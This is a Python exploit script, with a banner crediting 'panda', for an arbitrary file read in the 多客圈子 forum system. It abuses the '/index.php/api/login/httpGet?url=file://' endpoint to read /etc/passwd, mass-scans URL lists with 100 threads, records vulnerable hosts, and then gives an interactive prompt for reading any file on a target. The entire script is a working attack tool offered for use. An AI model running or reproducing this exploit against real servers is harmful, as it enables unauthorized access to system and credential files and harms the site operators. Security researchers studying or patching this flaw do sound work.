import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type: 多客圈子-论坛系统-任意文件读取
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="多客圈子-论坛系统-任意文件读取")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/index.php/api/login/httpGet?url=file:///etc/passwd"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "root" in res2.text:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}\n")
                    f.close()
                    print(f"[+]{target}存在任意文件读取漏洞")
                    return True
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请手动测试！！！")
    except Exception as e:
        print(e)
def exp(target):
    while True:
        cmd = input("请输入要查看的文件，从/目录开始，q退出\n>>>>>>>>>>>>>>>>>>>")
        if cmd == 'q':
            exit(0)
        payload = "/index.php/api/login/httpGet?url=file://"
        try:
            res3 = requests.get(url=target + payload +cmd, verify=False, timeout=5)
            if res3.text != "":
                print(res3.text)
            else:
                print("文件不存在，请重新输入")
        except Exception as e:
            print(e)


if __name__ == '__main__':
    main()